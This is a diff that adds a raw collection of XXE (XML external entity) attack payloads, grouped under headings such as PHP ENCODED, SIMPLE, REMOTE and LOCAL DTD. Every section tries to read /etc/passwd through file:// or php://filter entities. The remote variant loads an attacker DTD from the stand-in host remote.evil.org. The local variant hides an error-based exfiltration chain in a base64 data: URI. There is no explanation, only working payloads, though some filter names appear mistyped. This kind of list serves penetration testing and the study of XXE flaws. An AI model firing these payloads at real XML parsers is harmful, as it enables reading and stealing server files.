@@ -1,0 +1,91 @@
+<?xml version="1.0" ?>
+<!DOCTYPE username [ <!ELEMENT username ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<XTE version="2.0">
+
+<client>
+
+<username>&xxe;</username>
+
+
+============ PHP ENCODED ==========
+
+
+<!DOCTYPE root [
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64encode/resource=/etc/passwd">
+<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file://W00T%payload;W00T'>">
+%intern;
+%trick;
+]>
+<xml>
+<test>test</test>
+</xml>
+
+
+================= SIMPLE =============
+
+
+
+<!DOCTYPE root [
+<!ENTITY % evil SYSTEM "file:///etc/passwd">
+%evil;
+]>
+<xml>
+<test>test</test>
+</xml>
+
+
+================= REMOTE ===============
+
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://remote.evil.org/test.xml">
+%remote;
+%intern;
+%trick;
+]>
+<xml>
+<test>test</test>
+</xml>
+
+document hosted:
+
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64encode/
+resource=/etc/passwd">
+<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file://W00T%payload;W00T'>">
+
+
+
+
+============== INVALID FORMAT ================
+
+
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://remote.evil.org/test.xml">
+%remote;
+%intern;
+%trick;
+]>
+<xml>
+<test>test</invalid>
+</xml>
+
+
+
+
+============== LOCAL DTD onlu ==================
+
+
+<!DOCTYPE root [
+<!ENTITY % evil SYSTEM "php://filter/read=convert.base64decode/
+resource=data:,PCFFTlRJVFkgJSBwYXlsb2FkIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVyd
+C5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS9ldGMvcGFzc3dkIj4KPCFFTlRJVFkgJSBpbnRlcm4gIjwhRU5USVRZICYj
+Mzc7IHRyaWNrIFNZU1RFTSAnZmlsZTovL1cwMFQlcGF5bG9hZDtXMDBUJz4iPg">
+%evil;
+%intern;
+%trick;
+]>
+<xml>
+<test>test</invalid>
+</xml>
+
+
+
